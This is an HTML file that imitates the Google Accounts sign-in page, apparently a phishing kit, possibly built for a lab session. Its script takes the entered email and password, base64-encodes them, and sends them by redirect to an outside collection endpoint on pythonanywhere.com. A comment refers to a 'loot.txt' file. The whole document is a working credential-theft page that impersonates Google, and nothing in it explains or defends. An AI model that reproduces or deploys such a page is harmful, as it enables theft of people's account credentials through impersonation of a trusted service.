<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        img { width: 75px; }
        h1 { font-size: 24px; font-weight: 400; margin: 10px 0; }
        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <input type="email" id="user" placeholder="Email or phone" required>
        <input type="password" id="pass" placeholder="Enter your password" required>
        <button onclick="capture()">Next</button>
    </div>

    <script>
        function capture() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const listener = "https://labsession.pythonanywhere.com/capture";
            
            // This combines the data and hides it in Base64
            const secret = btoa("User: " + u + " | Pass: " + p);
            
            // Send it to your loot.txt
            window.location.replace(listener + "?data=" + secret);
        }
    </script>
</body>
</html>
